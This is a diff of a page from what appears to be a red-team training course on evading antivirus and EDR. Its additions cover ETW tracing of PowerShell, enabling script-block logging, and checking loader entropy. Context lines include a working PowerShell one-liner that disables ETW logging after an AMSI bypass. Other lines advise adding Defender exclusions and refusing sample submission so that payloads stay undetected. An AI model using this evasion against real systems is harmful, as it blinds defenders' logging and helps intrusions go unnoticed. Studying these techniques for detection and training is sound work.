@@ -969,75 +969,57 @@ A consumer is an app that reads a logged trace file (ETL file) or captures event
 <p>To see which ETW providers are running on the system</p>
 <pre><code class="language-code">logman query -ets
 </code></pre>
-<p>logman  query providers | select-string &quot;defender&quot;</p>
-<p>Notice sysmon, Windows Defender...</p>
-<pre><code class="language-code">logman query providers Microsoft-Windows-Kernel-Process
+<p><img src="./images/etw_logmanets.jpg" alt="Screenshot" /></p>
+<p>But there are a lot more ETW providers available:</p>
+<p><img src="./images/etw_logmanproviders.jpg" alt="Screenshot" /></p>
+<h1><a class="header" href="#interesting-etw-providers" id="interesting-etw-providers">Interesting ETW providers</a></h1>
+<blockquote>
+<ul>
+<li>Microsoft-Windows-Kernel-Process</li>
+<li>Microsoft-Windows-DotNETRuntime</li>
+<li>Microsoft-Windows-Threat-Intelligence</li>
+<li>Microsoft-Windows-Defender</li>
+<li>Microsoft-Windows-PowerShell</li>
+</ul>
+</blockquote>
+<p>So let's do a deep dive on what ETW can see in powershell by using logman to collect events to PowerShellTrace.etl.</p>
+<p>You can search the available ETW providers like this:</p>
+<pre><code class="language-powershell">logman  query providers | select-string &quot;powershell&quot;
 </code></pre>
-<table><thead><tr><th>Provider</th><th>GUID</th></tr></thead><tbody>
-<tr><td>Microsoft-Windows-Kernel-Process</td><td>{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}</td></tr>
-</tbody></table>
-<pre><code class="language-code">logman start mysession -p {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716} -o mytest.etl -ets
-logman start mysession -p Microsoft-Windows-Kernel-Process -o mytest.etl -ets
-logman stop mysession -ets
-tracerpt mytest.etl
+<p><img src="./images/etw_logmanqueryps.jpg" alt="Screenshot" /></p>
+<p>And get detailed information like this:</p>
+<pre><code class="language-powershell">logman query providers Microsoft-Windows-PowerShell
 </code></pre>
-<p>https://github.com/Microsoft/perfview/releases</p>
-<p>logman create trace MyETWSession -p &quot;Microsoft-Windows-Kernel-Process&quot; 0x8 -o &quot;C:\temp\kernel-process.etl&quot; -ets</p>
-<p>.\filebeat.exe -e -c filebeat.yml -d &quot;*&quot;</p>
-<hr />
-<pre><code class="language-powershell">logman start Microsoft-Windows-Kernel-Memory -p Microsoft-Windows-Kernel-Memory 0xffffffffffffffff win:informational -ets
-logman stop Microsoft-Windows-Kernel-Memory -ets 
+<p><img src="./images/etw_logmanquery.jpg" alt="Screenshot" /></p>
+<p>We'll set up an ETW tracing session for the powershell provider like this:</p>
+<pre><code class="language-powershell">logman create trace PowerShellTrace -p Microsoft-Windows-PowerShell -o PowerShellTrace.etl -ets
+logman -ets
 </code></pre>
-<p>tracerpt .\Microsoft-Windows-Kernel-Memory.etl -o Microsoft-Windows-Kernel-Memory.evtx -of evtx -lr</p>
-<p>Microsoft-Windows-DotNETRuntime
-Microsoft-Windows-Threat-Intelligence</p>
-<h2><a class="header" href="#provider---------------------------------guid" id="provider---------------------------------guid">Provider                                 GUID</a></h2>
-<p>Microsoft-Windows-Threat-Intelligence    {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}</p>
-<hr />
-<table><thead><tr><th>Value</th><th>Keyword</th><th>Description</th></tr></thead><tbody>
-<tr><td>0x0000000000000001</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL</td><td>Allocates virtual memory in the local process.</td></tr>
-<tr><td>0x0000000000000002</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER</td><td>Allocates virtual memory in the local process, called from kernel mode.</td></tr>
-<tr><td>0x0000000000000004</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE</td><td>Allocates virtual memory in a remote process.</td></tr>
-<tr><td>0x0000000000000008</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER</td><td>Allocates virtual memory in a remote process, called from kernel mode.</td></tr>
-<tr><td>0x0000000000000010</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL</td><td>Changes the protection on a region of virtual memory in the local process.</td></tr>
-<tr><td>0x0000000000000020</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in the local process, called from kernel mode.</td></tr>
-<tr><td>0x0000000000000040</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE</td><td>Changes the protection on a region of virtual memory in a remote process.</td></tr>
-<tr><td>0x0000000000000080</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in a remote process, called from kernel mode.</td></tr>
-<tr><td>0x0000000000000100</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL</td><td>Maps a view of a file mapping into the address space of the local process.</td></tr>
-<tr><td>0x0000000000000200</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of the local process, called from kernel mode.</td></tr>
-<tr><td>0x0000000000000400</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE</td><td>Maps a view of a file mapping into the address space of a remote process.</td></tr>
-<tr><td>0x0000000000000800</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of a remote process, called from kernel mode.</td></tr>
-<tr><td>0x0000000000001000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process.</td></tr>
-<tr><td>0x0000000000002000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process, called from kernel mode.</td></tr>
-<tr><td>0x0000000000004000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE</td><td>Sets the context of a thread in a remote process.</td></tr>
-<tr><td>0x0000000000008000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER</td><td>Sets the context of a thread in a remote process, called from kernel mode.</td></tr>
-<tr><td>0x0000000000010000</td><td>KERNEL_THREATINT_KEYWORD_READVM_LOCAL</td><td>Reads virtual memory in the local process.</td></tr>
-<tr><td>0x0000000000020000</td><td>KERNEL_THREATINT_KEYWORD_READVM_REMOTE</td><td>Reads virtual memory in a remote process.</td></tr>
-<tr><td>0x0000000000040000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL</td><td>Writes to virtual memory in the local process.</td></tr>
-<tr><td>0x0000000000080000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE</td><td>Writes to virtual memory in a remote process.</td></tr>
-<tr><td>0x0000000000100000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD</td><td>Suspends a thread.</td></tr>
-<tr><td>0x0000000000200000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_THREAD</td><td>Resumes a suspended thread.</td></tr>
-<tr><td>0x0000000000400000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS</td><td>Suspends all threads in a process.</td></tr>
-<tr><td>0x0000000000800000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_PROCESS</td><td>Resumes all threads in a suspended process.</td></tr>
-<tr><td>0x0000000001000000</td><td>KERNEL_THREATINT_KEYWORD_FREEZE_PROCESS</td><td>Freezes a process, preventing it from executing.</td></tr>
-<tr><td>0x0000000002000000</td><td>KERNEL_THREATINT_KEYWORD_THAW_PROCESS</td><td>Thaws a frozen process, allowing it to execute.</td></tr>
-<tr><td>0x0000000004000000</td><td>KERNEL_THREATINT_KEYWORD_CONTEXT_PARSE</td><td>Parses the context of a process or thread.</td></tr>
-<tr><td>0x0000000008000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_VAD_PROBE</td><td>Probes the virtual address descriptor (VAD) for an execution address.</td></tr>
-<tr><td>0x0000000010000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_MMF_NAME_PROBE</td><td>Probes the memory-mapped file (MMF) name for an execution address.</td></tr>
-<tr><td>0x0000000020000000</td><td>KERNEL_THREATINT_KEYWORD_READWRITEVM_NO_SIGNATURE_RESTRICTION</td><td>Reads or writes virtual memory without signature restrictions.</td></tr>
-<tr><td>0x0000000040000000</td><td>KERNEL_THREATINT_KEYWORD_DRIVER_EVENTS</td><td>Logs events related to kernel-mode drivers.</td></tr>
-<tr><td>0x0000000080000000</td><td>KERNEL_THREATINT_KEYWORD_DEVICE_EVENTS</td><td>Logs events related to device operations.</td></tr>
-<tr><td>0x8000000000000000</td><td>Microsoft-Windows-Threat-Intelligence/Analytic</td><td>Logs analytic events for threat intelligence.</td></tr>
-</tbody></table>
-<table><thead><tr><th>Value</th><th>Level</th><th>Description</th></tr></thead><tbody>
-<tr><td>0x04</td><td>win:Informational</td><td>Information</td></tr>
-</tbody></table>
-<table><thead><tr><th>PID</th><th>Image</th></tr></thead><tbody>
-<tr><td>0x00000000</td><td></td></tr>
-</tbody></table>
-<p>https://github.com/Lsecqt-Sponsors/Haunt_Agent/blob/main/Payload_Type/haunt/haunt/agent_code/etw.ps1
-https://github.com/MHaggis/PowerShell-Hunter</p>
-<p>https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/</p>
+<p><img src="./images/etw_logmancreate.jpg" alt="Screenshot" /></p>
+<p>This will create an event trace log (.etl file), which we can then convert to txt, csv or even evtx (windows event log format), any commands we run will be collected. In the same powershell console you just ran the create trace command, run some powershell commands:</p>
+<pre><code class="language-powershell">$pid
+get-process
+</code></pre>
+<blockquote>
+<p><em><strong>IMPORTANT:</strong></em> After running our commands, stop the powershell event trace session and remove it (otherwise this keep collecting logs)</p>
+</blockquote>
+<pre><code class="language-powershell">logman stop PowerShellTrace -ets
+Remove-EtwTraceSession -Name PowerShellTrace
+</code></pre>
+<p>We have now collected ETW Telemetry on powershell, we could ship this of to an Elastic stack, but for now let's just convert the trace file to an EVTX log that we can view with Windows Eventviewer.</p>
+<pre><code class="language-powershell">tracerpt PowerShellTrace.etl -o PowershellTrace.evtx -of evtx -lr
+</code></pre>
+<p><img src="./images/etw_logmantrace1.jpg" alt="Screenshot" /></p>
+<p>Now open Windows Eventviewer and load the saved log by going to <code>ACTION</code> and then <code>SAVED LOG</code>, browse to your PowerShellTrace.evtx file and click <code>OK</code>.:</p>
+<p><img src="./images/etw_evt1.jpg" alt="Screenshot" /></p>
+<p>We see a whole bunch of logs here, but let's see if we can find the commands we typed ($pid and get-process), by filtering for event ID 4104</p>
+<p><img src="./images/etw_evt2.jpg" alt="Screenshot" /></p>
+<p>Click on <code>Filter Current Log</code> in the right pane of eventviewer and enter `4104</p>
+<p><img src="./images/etw_evt4104.jpg" alt="Screenshot" /></p>
+<p>And yes we can find both commands:</p>
+<p><img src="./images/etw_evtpid.jpg" alt="Screenshot" /></p>
+<p><img src="./images/etw_evtgetproc.jpg" alt="Screenshot" /></p>
+<h1><a class="header" href="#mini-lab---bypassing-etw-in-powershell" id="mini-lab---bypassing-etw-in-powershell">MINI LAB - BYPASSING ETW in Powershell</a></h1>
 <p>run after amsi bypass:</p>
 <pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
 </code></pre>
@@ -1200,6 +1182,17 @@ g { color: Green }
 <p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
 <strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
 </blockquote>
+<blockquote>
+<p><em><strong>ENABLE POWERSHELL LOGGING</strong></em> : For this lab and all future labs, turn on powershell logging on your windows machine.</p>
+</blockquote>
+<p><img src="./images/ps_gpol.jpg" alt="image" /></p>
+<p>Go to Local Computer Policy - Computer Configuration - Administrative Templates - Windows Components.</p>
+<p><img src="./images/ps_gpol1.jpg" alt="image" /></p>
+<p>Scroll down to Microsoft Powershell and enable <code>MODULE LOGGING</code> and <code>SCRIPT BLOCK LOGGING</code>.</p>
+<p><img src="./images/ps_gpol2.jpg" alt="image" /></p>
+<p>This will log any powershell commands and script contents run in a powershell console - using eventviewer we can have a look for Event ID 800, 4103 and 4104. Open Eventviewer and go to <code>Applications and Services Logs</code> - <code>MICROSOFT</code> - <code>POWERSHELL</code> - <code>OPERATIONAL</code>.</p>
+<p><img src="./images/ps_evt.jpg" alt="image" /></p>
+<p><img src="./images/ps_evt1.jpg" alt="image" /></p>
 <p>Make exceptions in Windows Defender:</p>
 <pre><code class="language-bash">[+] C:\Downloads -&gt; to make it easier to download our tools with out AV Detection
 [+] C:\THEV -&gt; our training course
@@ -1696,7 +1689,8 @@ dotnet build
 dotnet run
 </code></pre>
 <blockquote>
-<p>INCLUDE SCREENSHOT of CLR info of sharkpatz/rubeus</p>
+<p>INCLUDE SCREENSHOT of CLR info of sharkpatz/rubeus
+SHOW dotpeek - disadvantages of C#</p>
 </blockquote>
 <p><img src="./images/sharpkatz_clr.jpg" alt="Screenshot" /></p>
 <h1><a class="header" href="#lab---havoc-dotnet-execute" id="lab---havoc-dotnet-execute">Lab - Havoc dotnet execute</a></h1>
@@ -2432,10 +2426,15 @@ Files with high entropy (&gt;7.5) are typically blocked by AV/EDR when touching 
 </blockquote>
 <p><img src="./images/labxor_loader.jpg" alt="Screenshot" /></p>
 <p>Let's check the emtropy of our XORLoader. We can use sigcheck from the <code>systeminternals suite</code>.</p>
-<pre><code class="language-powershell">sigcheck64.exe -a .\XLoader.exe
+<pre><code class="language-powershell">sigcheck64.exe -a -h .\XLoader.exe
+</code></pre>
+<p>or </p>
+<pre><code class="language-powershell">sigcheck64.exe -a XLoader.exe | FINDSTR /I entropy
 </code></pre>
 <p><img src="./images/labxor_sigcheck.jpg" alt="Screenshot" /></p>
 <p>Our Entropy here is &quot;5&quot; - which is pretty low and shouldn't flag AV/EDR.</p>
+<h1><a class="header" href="#fixing-entropy" id="fixing-entropy">Fixing Entropy</a></h1>
+<p><a href="https://github.com/gmh5225/shellcode-EntropyFix">https://github.com/gmh5225/shellcode-EntropyFix</a></p>
 <h1><a class="header" href="#lab---staged-loader" id="lab---staged-loader">Lab - Staged Loader</a></h1>
 <style>
 r { color: Red }
@@ -2560,6 +2559,7 @@ Add some options to evade AV -&gt; SetLastError, ExactSpelling</p>
 <p><a href="https://github.com/horsicq/Detect-It-Easy/">https://github.com/horsicq/Detect-It-Easy/</a></p>
 <p><img src="./images/litter_DIE.jpg" alt="image" /></p>
 <h2><a class="header" href="#3-litterbox" id="3-litterbox">3. Litterbox</a></h2>
+<p>Install Python 3.x</p>
 <pre><code class="language-powershell">cd git
 git clone https://github.com/BlackSnufkin/LitterBox.git
 cd LitterBox
@@ -2819,6 +2819,70 @@ sigcheck.exe -h -a &quot;D:\Malware\11&quot;</p>
 <li>https://github.com/Xacone/BestEdrOfTheMarket</li>
 </ol>
 </blockquote>
+<h1><a class="header" href="#etw-stuff" id="etw-stuff">ETW Stuff</a></h1>
+<table><thead><tr><th>Provider</th><th>GUID</th></tr></thead><tbody>
+<tr><td>Microsoft-Windows-Kernel-Process</td><td>{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}</td></tr>
+</tbody></table>
+<pre><code class="language-code">logman start mysession -p {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716} -o mytest.etl -ets
+logman start mysession -p Microsoft-Windows-Kernel-Process -o mytest.etl -ets
+logman stop mysession -ets
+tracerpt mytest.etl
+</code></pre>
+<p>https://github.com/Microsoft/perfview/releases</p>
+<p>logman create trace MyETWSession -p &quot;Microsoft-Windows-Kernel-Process&quot; 0x8 -o &quot;C:\temp\kernel-process.etl&quot; -ets</p>
+<p>.\filebeat.exe -e -c filebeat.yml -d &quot;*&quot;</p>
+<hr />
+<pre><code class="language-powershell">logman start Microsoft-Windows-Kernel-Memory -p Microsoft-Windows-Kernel-Memory 0xffffffffffffffff win:informational -ets
+logman stop Microsoft-Windows-Kernel-Memory -ets 
+</code></pre>
+<p>tracerpt .\Microsoft-Windows-Kernel-Memory.etl -o Microsoft-Windows-Kernel-Memory.evtx -of evtx -lr</p>
+<h2><a class="header" href="#provider---------------------------------guid" id="provider---------------------------------guid">Provider                                 GUID</a></h2>
+<p>Microsoft-Windows-Threat-Intelligence    {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}</p>
+<hr />
+<table><thead><tr><th>Value</th><th>Keyword</th><th>Description</th></tr></thead><tbody>
+<tr><td>0x0000000000000001</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL</td><td>Allocates virtual memory in the local process.</td></tr>
+<tr><td>0x0000000000000002</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_LOCAL_KERNEL_CALLER</td><td>Allocates virtual memory in the local process, called from kernel mode.</td></tr>
+<tr><td>0x0000000000000004</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE</td><td>Allocates virtual memory in a remote process.</td></tr>
+<tr><td>0x0000000000000008</td><td>KERNEL_THREATINT_KEYWORD_ALLOCVM_REMOTE_KERNEL_CALLER</td><td>Allocates virtual memory in a remote process, called from kernel mode.</td></tr>
+<tr><td>0x0000000000000010</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL</td><td>Changes the protection on a region of virtual memory in the local process.</td></tr>
+<tr><td>0x0000000000000020</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_LOCAL_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in the local process, called from kernel mode.</td></tr>
+<tr><td>0x0000000000000040</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE</td><td>Changes the protection on a region of virtual memory in a remote process.</td></tr>
+<tr><td>0x0000000000000080</td><td>KERNEL_THREATINT_KEYWORD_PROTECTVM_REMOTE_KERNEL_CALLER</td><td>Changes the protection on a region of virtual memory in a remote process, called from kernel mode.</td></tr>
+<tr><td>0x0000000000000100</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL</td><td>Maps a view of a file mapping into the address space of the local process.</td></tr>
+<tr><td>0x0000000000000200</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_LOCAL_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of the local process, called from kernel mode.</td></tr>
+<tr><td>0x0000000000000400</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE</td><td>Maps a view of a file mapping into the address space of a remote process.</td></tr>
+<tr><td>0x0000000000000800</td><td>KERNEL_THREATINT_KEYWORD_MAPVIEW_REMOTE_KERNEL_CALLER</td><td>Maps a view of a file mapping into the address space of a remote process, called from kernel mode.</td></tr>
+<tr><td>0x0000000000001000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process.</td></tr>
+<tr><td>0x0000000000002000</td><td>KERNEL_THREATINT_KEYWORD_QUEUEUSERAPC_REMOTE_KERNEL_CALLER</td><td>Queues an asynchronous procedure call (APC) to a thread in a remote process, called from kernel mode.</td></tr>
+<tr><td>0x0000000000004000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE</td><td>Sets the context of a thread in a remote process.</td></tr>
+<tr><td>0x0000000000008000</td><td>KERNEL_THREATINT_KEYWORD_SETTHREADCONTEXT_REMOTE_KERNEL_CALLER</td><td>Sets the context of a thread in a remote process, called from kernel mode.</td></tr>
+<tr><td>0x0000000000010000</td><td>KERNEL_THREATINT_KEYWORD_READVM_LOCAL</td><td>Reads virtual memory in the local process.</td></tr>
+<tr><td>0x0000000000020000</td><td>KERNEL_THREATINT_KEYWORD_READVM_REMOTE</td><td>Reads virtual memory in a remote process.</td></tr>
+<tr><td>0x0000000000040000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_LOCAL</td><td>Writes to virtual memory in the local process.</td></tr>
+<tr><td>0x0000000000080000</td><td>KERNEL_THREATINT_KEYWORD_WRITEVM_REMOTE</td><td>Writes to virtual memory in a remote process.</td></tr>
+<tr><td>0x0000000000100000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_THREAD</td><td>Suspends a thread.</td></tr>
+<tr><td>0x0000000000200000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_THREAD</td><td>Resumes a suspended thread.</td></tr>
+<tr><td>0x0000000000400000</td><td>KERNEL_THREATINT_KEYWORD_SUSPEND_PROCESS</td><td>Suspends all threads in a process.</td></tr>
+<tr><td>0x0000000000800000</td><td>KERNEL_THREATINT_KEYWORD_RESUME_PROCESS</td><td>Resumes all threads in a suspended process.</td></tr>
+<tr><td>0x0000000001000000</td><td>KERNEL_THREATINT_KEYWORD_FREEZE_PROCESS</td><td>Freezes a process, preventing it from executing.</td></tr>
+<tr><td>0x0000000002000000</td><td>KERNEL_THREATINT_KEYWORD_THAW_PROCESS</td><td>Thaws a frozen process, allowing it to execute.</td></tr>
+<tr><td>0x0000000004000000</td><td>KERNEL_THREATINT_KEYWORD_CONTEXT_PARSE</td><td>Parses the context of a process or thread.</td></tr>
+<tr><td>0x0000000008000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_VAD_PROBE</td><td>Probes the virtual address descriptor (VAD) for an execution address.</td></tr>
+<tr><td>0x0000000010000000</td><td>KERNEL_THREATINT_KEYWORD_EXECUTION_ADDRESS_MMF_NAME_PROBE</td><td>Probes the memory-mapped file (MMF) name for an execution address.</td></tr>
+<tr><td>0x0000000020000000</td><td>KERNEL_THREATINT_KEYWORD_READWRITEVM_NO_SIGNATURE_RESTRICTION</td><td>Reads or writes virtual memory without signature restrictions.</td></tr>
+<tr><td>0x0000000040000000</td><td>KERNEL_THREATINT_KEYWORD_DRIVER_EVENTS</td><td>Logs events related to kernel-mode drivers.</td></tr>
+<tr><td>0x0000000080000000</td><td>KERNEL_THREATINT_KEYWORD_DEVICE_EVENTS</td><td>Logs events related to device operations.</td></tr>
+<tr><td>0x8000000000000000</td><td>Microsoft-Windows-Threat-Intelligence/Analytic</td><td>Logs analytic events for threat intelligence.</td></tr>
+</tbody></table>
+<table><thead><tr><th>Value</th><th>Level</th><th>Description</th></tr></thead><tbody>
+<tr><td>0x04</td><td>win:Informational</td><td>Information</td></tr>
+</tbody></table>
+<table><thead><tr><th>PID</th><th>Image</th></tr></thead><tbody>
+<tr><td>0x00000000</td><td></td></tr>
+</tbody></table>
+<p>https://github.com/Lsecqt-Sponsors/Haunt_Agent/blob/main/Payload_Type/haunt/haunt/agent_code/etw.ps1
+https://github.com/MHaggis/PowerShell-Hunter</p>
+<p>https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/</p>
 <h1><a class="header" href="#additional-privesc" id="additional-privesc">Additional PrivEsc</a></h1>
 <blockquote>
 <p><em><strong>IMPORTANT</strong></em>: We achieve not only <code>Privilege Escalation</code>, but also <code>code-execution</code> and <code>persistence</code>!!!</p>
